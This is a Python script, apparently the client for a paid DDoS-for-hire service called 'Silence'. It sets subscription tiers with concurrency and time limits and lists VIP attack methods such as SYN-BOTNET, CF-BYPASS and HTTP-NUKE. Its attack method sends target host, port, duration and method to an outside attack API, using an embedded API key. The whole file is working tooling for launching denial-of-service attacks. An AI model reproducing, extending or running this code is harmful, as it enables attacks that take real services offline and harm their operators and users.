import requests, time, json, getpass, threading, schedule
import pandas as pd



data = {
        'Concurrent' : [0],
        'time': [0]
    }
database = pd.DataFrame(data)

InformationPlan = {
    'bronze': {
        'concurrent': 2,
        'maxtime': 120,
        
    },
    'sliver': {
        'concurrent': 3,
        'maxtime': 300,

    },
    'gold': {
        'concurrent': 6,
        'maxtime': 800,
    },
    'platinum': {
        'concurrent': 7,
        'maxtime': 1300,
    },
    'diamond': {
        'concurrent': 8,
        'maxtime': 1400,
    },
    'owners': {
        'concurrent': 20,
        'maxtime': 10000,
    },
    'methodvip': ['SYN-BOTNET', 'VSE-BOTNET', 'STD-BOTNET','DNS-PROVIDERS','NTP-PROVIDERS','DVR-PROVIDERS','MIX-PROVIDERS','TYNAHOST-HOSTING','ENXADAHOST-HOSTING','GAMERSCLUB-HOSTING','RUST-UDP','FIVEM-BYPASS','OVH-GAMING','CF-BYPASS','CF-UAM-BYPASS','CF-PRO-BYPASS', 'OVH-NUKE', 'DNS-NUKE', 'SYN-NUKE','HANDSHAKE-NUKE', 'UDP-NUKE', 'HTTP-NUKE', 'HTTPS-NUKE']

}


class SilenceAttack:
    def attack(self, host, port, time, method):
        # Get User
        user_id = getpass.getuser()

        with open('subscriptions.json', 'r') as f:
            subscriptions = json.load(f)
        # Check plan
        if user_id in subscriptions:
            # Json
            plan = subscriptions[user_id]['plan']
            limit_conc = InformationPlan[plan]['concurrent']
            limit_times = InformationPlan[plan]['maxtime']
            vip = subscriptions[user_id]['vip']
            methodsvip = InformationPlan['methodvip']
            conc = database['Concurrent'].values
            times = database['time'].values
            conc = int(conc)
            time = int(time)
            if conc > limit_conc:
                return print(f'Max : {limit_conc} Concurrent')
            else:
                if time > limit_times:
                    return print(f'Max : {limit_times} Time')
                else:
                    if method in methodsvip:
                        if vip == "True":
                            database['Concurrent'] = conc + 1
                            database['time'] = times + time
                            requests.get(f'https://silence.website/hub/api/api.php?key=wm37xt2dpov24smz9pqvpwra6qscpi&host={host}&port={port}&time={time}&method={method}')
                            print('[>} Attack Succes :)')

                            
                            
                        else:
                            return print('Upgrade Plan')
                            
                            
                            
                    else:
                        database['Concurrent'] = conc + 1
                        database['time'] = times + time

                        requests.get(f'https://silence.website/hub/api/api.php?key=wm37xt2dpov24smz9pqvpwra6qscpi&host={host}&port={port}&time={time}&method={method}')
                        print('[>} Attack Succes :)')

        else:
            return print('Buy Plan')


